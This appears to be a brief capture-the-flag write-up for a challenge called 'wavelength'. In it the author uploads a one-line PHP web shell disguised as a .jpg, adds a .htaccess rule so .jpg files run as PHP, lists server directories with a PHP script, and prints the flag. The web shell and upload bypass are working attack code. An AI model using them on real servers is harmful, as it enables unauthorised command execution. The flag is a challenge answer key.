# wavelength
"in this we have to upload the shell.php sneakingly and find the flag"
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

```
"first i made a shell.php and parsed it as shell.php.jpg"
"now to make it active as jpg is not acting as php i have uploaded a .htaccess"
```
AddType application/x-httpd-php .jpg
```
then we can use php but i cant find any thing good just the trash by others
![image](https://github.com/user-attachments/assets/65b57bf0-b0a9-45ba-a40d-f1060eae3ecf)
"then i remade a script to list all the dirs"

```php
<?php
echo "<h2>Contents of /</h2>";
system('ls -la /');

$dirs = glob('/*', GLOB_ONLYDIR);

foreach ($dirs as $dir) {
    echo "<h3>Contents of $dir</h3>";
    system("ls -la " . escapeshellarg($dir));
}
?>
```
"and then i ran it and tried for getting it "
![image](https://github.com/user-attachments/assets/732dfe3e-7455-4e47-9ecd-052efbbf5377)
![image](https://github.com/user-attachments/assets/63e71134-ff5b-47a3-a3c3-33149d579a23)

"and boom here we get the flag"

### 🏁 Flag  
```
FLAG{rce_filename_bypass_1337}

```
